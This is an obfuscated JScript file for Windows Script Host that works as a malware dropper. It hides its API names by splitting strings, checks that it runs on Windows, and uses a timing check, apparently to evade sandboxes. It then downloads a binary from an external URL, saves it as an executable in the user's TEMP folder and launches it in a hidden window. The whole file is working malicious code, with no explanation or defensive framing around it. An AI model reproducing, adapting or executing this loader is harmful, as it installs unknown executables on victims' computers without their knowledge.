var WL = false;
var V0 = "Create"+"Object";
var W0 = function PR() {return WScript[V0]("WScript"+".Shell");}(), G0 = 11;
var I = "MSXML2"+".XMLHTTP";
var H = 2;
var C = H - 2;
function MW(UX){W0["Run"](UX, C, C);};
function HC(){return I + "";};
function EU(TG, W1){C = C * 1; return TG - W1;};
function Q(){return V0;};
/*@cc_on
  @if (@_win32 || @_win64)
    WL = true;
  @end
@*/
if (WL)
{
var KM = "";
function X(){return 22;};
var W = 0; var Z = 0;
function EY()
{
var ML = new this["Date"]();
var ZF = ML["getUTCMilliseconds"]();
WScript["Sleep"](X());
var ML = new this["Date"]();
var CO = ML["getUTCMilliseconds"]();
WScript["Sleep"](X());
var ML = new this["Date"]();
var U = ML["getUTCMilliseconds"]();
var W = "L";
W = EU(CO, ZF);
var Z = "UQ";
Z = EU(U, CO);
KM = "open";
return EU(W, Z);
}
var NV = false;
var F = false;
for (var RH = C; RH < X() * 1; RH++){if (EY() != C){
NV = true; 
Z = "31" + 11 * W + Z; 
F = true; 
break;
}}
function GE() {return ((NV == true) && (NV == F)) ? 1 : C;};
if (NV && GE() && F){
function V() {return W0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "26TumngsGJmIc.ex" + "e";};
 A = HC();
 I0 = WScript[V0](A);
 var X0 = 1;
do { 
	for (;X0;){
	try {
		if (X0 == 1)
		{
			I0[KM]("GET", "http://tools24.nl/w8isa", false);
			I0["send"]();
			G = "Sleep";
			X0 = 2;
		}
		WScript[G](X() + 120); 
		if (I0["readystate"] < 2 * 2) continue;
		X0 = C;
		function R(MO) {var P0 = (1, 2, 3, 4, 5, MO); return P0;};
		QQ = WScript[Q()]("ADODB.Stream");
		A = QQ;
		A[KM]();
		A["type"] = R(1);
		A["write"](I0["ResponseBody"]);
		QQ["position"] = R(C);
		A["Save" + "ToFile"](V(), 2);
		QQ["cl"+"ose"]();
		P = V();
		MW(P);
	} catch(HE){};};
}while (X0);
}
}

